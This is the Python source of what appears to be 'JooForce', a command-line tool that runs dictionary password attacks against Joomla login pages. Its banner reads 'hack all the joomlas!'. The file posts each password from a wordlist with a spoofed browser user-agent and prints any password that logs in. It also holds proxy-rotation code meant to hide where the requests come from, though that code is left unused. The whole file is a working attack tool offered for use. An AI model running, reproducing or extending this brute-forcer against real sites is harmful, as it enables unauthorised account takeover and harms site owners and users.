#
#    Copyright intninety 2012
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
import random
import sys
import urllib
import urllib2


INVALID_LOGIN_CONST = "Use a valid username and password to gain access"

class ProxyStack:
    file_path=""
    raw_data = [] # raw data read in from txt file
    proxies = [] # proxies
    curr_index = 0
    
    def __init__(self,filep):
        self.file_path = filep
        
    def parse(self):
        try:
            with open(self.file_path,'r') as f:
                self.raw_data = (f.readlines())
                for row in self.raw_data:
                    if not ":" in row:
                        row = row.rstrip() + ':80'                    
                    self.proxies.append(row.rstrip()) # strip out /n chars using row.rstrip
        except IOError:
               print( "Failed to open proxy list : %s\n" % (self.file_path) )
                       
    def getRandomProxy(self):
        x = len(self.proxies)
        index = random.randint(0,x)
        if not index == self.curr_index:
            self.curr_index = index
            index = 0
            return self.proxies[self.curr_index - 1]
        else:
            return self.getRandomProxy()

    def getProxy(self):
        if self.curr_index < len(self.proxies) :
            self.curr_index = self.curr_index + 1
            return self.proxies[self.curr_index - 1]

class HttpPostRequest:
	"""A class that posts data to a URL via HTTP"""
	url = ""
	headers = ""
	post_data = ""
	
	def __init__(self, url = "", headers = {}, post_data = {}):
		self.url = url
		self.headers = headers
		self.post_data = post_data

	def addHeader(self, key, value):
		self.headers[key] = value

	def addPostField(self, key, value):
		self.post_data[key] = value

	def getResponse(self):
		data = urllib.urlencode(self.post_data)
		req = urllib2.Request(self.url, data, self.headers)
		response_body = ""

		try:
			response = urllib2.urlopen(req)
			response_body = response.read()
		except:
			print "  [!] WARNING: An error occurred when posting to the page."
			print "               Further requests may lead to false positives."
			print ""
			print "               Do you want to continue? [yes/no]"
			user_response = raw_input("            --> ")

			if (user_response.strip().startswith("y")):
				response_body = INVALID_LOGIN_CONST
			else:
				response_body = None	

		return response_body

class JooForce:
	"""A class to provide the brute forcing functionality"""
	path = ""
	username = ""
	user_agent = ""
	verbose = False
	request = HttpPostRequest()

	def __init__(self, path, url, username = None, user_agent = None):
		self.path = path
		self.request.url = url

		if (username == None):
			self.username = "admin"
		else:
			self.username = username

		if ((user_agent == None) or (user_agent.strip() == "")):
			self.user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
		else:
			self.user_agent = user_agent
			
		self.request.addHeader("User-Agent", self.user_agent)

	def start(self):
		print "  [+] Starting dictionary attack..."
		try:
			with open(self.path) as f:
				for line in f:
					password = line.rstrip()
					
					if (self.verbose):
						print "  [-] Trying {0}:{1}".format(self.username, password)
						
					values = {'username' : self.username, 'passwd' : password}
					self.request.post_data = values
					response = self.request.getResponse()

					if (response == None):
						print "  [-] Operation cancelled!"
						print ""
						return
					else:
						if not INVALID_LOGIN_CONST in response:
							print ""
							print "  --------------------------------"
							print ""
							print "  [+] Login found!"
							print "  [-] Password is: " + password
							print ""
			  				return	
		except (IOError) as e:
			print ""
			print "  [!] The dictionary could not be opened. Check the path and try again."
			print ""
		

print('')
print('')
print('     d8b                    .d888                                 ')
print('     Y8P                   d88P"                                  ')
print('                           888                                    ')
print('    8888  .d88b.   .d88b.  888888 .d88b.  888d888 .d8888b .d88b.  ')
print('    "888 d88""88b d88""88b 888   d88""88b 888P"  d88P"   d8P  Y8b ')
print('     888 888  888 888  888 888   888  888 888    888     88888888 ')
print('     888 Y88..88P Y88..88P 888   Y88..88P 888    Y88b.   Y8b.     ')
print('     888  "Y88P"   "Y88P"  888    "Y88P"  888     "Y8888P "Y8888  ')
print('     888 -------------------------------------------------------- ')
print('    d88P                                    hack all the joomlas! ')
print('  888P"                                                           ')
print('')
print('')
print('  [-] Usage: python jooforce.py --url --user --dic [-vh --useragent]')
print('      ---------------------------------------------------------------')
print('      --dic       : the password dictionary to brute force with      ')
print('      -h          : display this information                         ')
print('      --url       : the URL of the Joomla login page                 ')
print('      --user      : the username to attempt to login as              ')
print('      --useragent : the user-agent string to post                    ')
print('      -v          : enable verbose output                            ')
print('      --p <path>  : point to the proxy list file                     ')
print('      -r          : randomise proxy selection                        ')
print('')
print('')

verboseMode = False
isRandom = False
dictionaryPath = None
proxypath = None
url = None
user = None
useragent = None

arg_index = 0
for arg in sys.argv:
	if (arg == "-v" or arg == "-V"):
		verboseMode = True
	elif (arg == "-h"):
		sys.exit(0)
	elif (arg == "--dic"):
		dictionaryPath = sys.argv[arg_index + 1]
	elif (arg == "--url"):
		url = sys.argv[arg_index + 1]
	elif (arg == "--user"):
		user = sys.argv[arg_index + 1]
	elif (arg == "--useragent"):
		useragent = sys.argv[arg_index + 1]
	elif (arg=="--p"):
		proxyPath = sys.argv[arg_index +1]
	elif (arg=="-r"):
		isRandom = True
	arg_index = arg_index + 1
		

errors = []

if (dictionaryPath == None):
	errors.append("  [-] No dictionary path specified.")

if (url == None):
	errors.append("  [-] No URL specified.")

if (user == None):
	errors.append("  [-] No username specified.")

if (len(errors) > 0):
	print "  [!] One or more required parameters are missing (see below)."
	for error in errors:
		print error
	print ""
else:
	o = JooForce(dictionaryPath, url, user)
	o.verbose = verboseMode

	if (useragent != None):
		o.user_agent = useragent
	
	o.start()
